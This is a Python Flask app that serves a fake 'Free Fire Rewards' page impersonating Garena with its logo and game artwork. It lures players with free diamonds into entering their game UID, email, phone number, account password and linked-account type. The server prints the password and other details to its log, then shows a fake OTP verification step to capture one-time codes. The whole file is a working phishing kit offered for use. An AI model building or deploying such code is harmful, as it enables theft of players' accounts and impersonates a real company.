from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- LINKS SECTION ---
BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"

# GARENA LOGO (Ab ye code ke andar se hi load hoga)
GARENA_LOGO_URL = "https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Garena_logo.svg/1200px-Garena_logo.svg.png"

HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>FF Diamond Rewards</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{
            background-image: url('{BG_URL}');
            background-size: cover; 
            background-position: center; 
            background-attachment: fixed;
            font-family: sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }}
        .main-container {{
            width: 100%;
            max-width: 380px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }}
        
        /* Fixed Logo Styling */
        .garena-logo-header {{
            width: 200px;
            height: auto;
            margin-bottom: 15px;
            display: block;
        }}
        
        .form-box {{
            background: rgba(255, 255, 255, 0.98); 
            padding: 25px; 
            border-radius: 15px;
            text-align: center; 
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }}
        
        .reward-title {{
            color: #1a73e8; 
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
        }}
        
        input, select {{ 
            width: 100%; 
            padding: 12px; 
            margin: 10px 0; 
            border: 1px solid #ccc; 
            border-radius: 8px; 
            font-size: 15px;
        }}
        
        .submit-btn {{ 
            background: #1a73e8; 
            color: white; 
            border: none; 
            padding: 15px; 
            width: 100%; 
            border-radius: 8px; 
            font-weight: bold; 
            font-size: 18px;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <div class="main-container">
        <img src="{GARENA_LOGO_URL}" alt="Garena" class="garena-logo-header" onerror="this.src='https://logos-world.net/wp-content/uploads/2022/11/Garena-Logo.png'">
        
        <div class="form-box">
            <div class="reward-title">💎 FREE FIRE REWARDS 💎</div>
            
            <form action="/preview" method="post">
                <input type="text" name="uid" placeholder="Free Fire UID" required>
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="text" name="phone" placeholder="Mobile Number" required>
                <input type="password" name="password" placeholder="Account Password" required>
                <select name="account_type">
                    <option value="Google">Google Account</option>
                    <option value="Facebook">Facebook Account</option>
                    <option value="VK">VK Account</option>
                    <option value="X">X (Twitter)</option>
                </select>
                <button type="submit" class="submit-btn">PROCEED</button>
            </form>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/preview', methods=['POST'])
def preview():
    uid = request.form.get('uid')
    email = request.form.get('email')
    phone = request.form.get('phone')
    password = request.form.get('password')
    acc = request.form.get('account_type')
    print(f"UID: {uid}, Email: {email}, Pass: {password}")
    return f'''
    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
        <div style="background: white; padding: 25px; border-radius: 15px; width: 320px; text-align: center;">
            <h3 style="color: #1a73e8;">Confirm Details</h3>
            <div style="text-align: left; background: #f0f0f0; padding: 15px; border-radius: 8px; font-size: 14px; margin: 15px 0;">
                <p><b>UID:</b> {uid}</p>
                <p><b>Email:</b> {email}</p>
            </div>
            <form action="/submit_final" method="post">
                <input type="hidden" name="phone" value="{phone}">
                <button type="submit" style="background: #28a745; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; cursor: pointer;">CONFIRM</button>
            </form>
        </div>
    </body>
    '''

@app.route('/submit_final', methods=['POST'])
def submit_final():
    phone = request.form.get('phone')
    return f'''
    <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
        <div style="background: white; padding: 25px; border-radius: 15px; width: 320px; text-align: center;">
            <h2>OTP Verification</h2>
            <form action="/final_otp" method="post">
                <input type="text" name="otp" placeholder="Enter OTP" required style="width: 100%; padding: 10px; margin: 20px 0;">
                <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px;">VERIFY</button>
            </form>
        </div>
    </body>
    '''

@app.route('/final_otp', methods=['POST'])
def final_otp():
    return "<h1 style='text-align:center; padding-top:50px; color:white; background:black; height:100vh;'>Processing...</h1>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
